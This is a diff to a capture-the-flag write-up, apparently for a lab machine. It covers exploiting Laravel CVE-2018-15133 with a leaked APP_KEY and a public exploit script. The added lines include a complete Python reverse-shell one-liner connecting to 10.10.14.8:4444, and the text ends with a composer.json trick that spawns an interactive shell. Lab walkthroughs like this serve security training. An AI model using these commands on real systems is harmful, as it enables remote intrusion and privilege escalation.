@@ -35,11 +35,16 @@ After some search on the page i noticed "laravel.log" on exception message and t
 There are several exploits for this CVE, i'll use this [python sctipt](https://github.com/aljavier/exploit_laravel_cve-2018-15133)
 ![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/pwn_laravel.PNG)
 
-We need API_KEY to exploit it, luckily we can find it at the dev-staging page
+We need API_KEY to exploit the application, luckily we can find it at the dev-staging page
 ![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/app_key.PNG)
 
+Now we can execute some code in interractive mode using the exploit
+![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/pwn_laravel_int.PNG)
 
+There is python3 on the system and we get revers-shell using following command:
+``````
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+``````
 
 TF=$(mktemp -d)
 echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
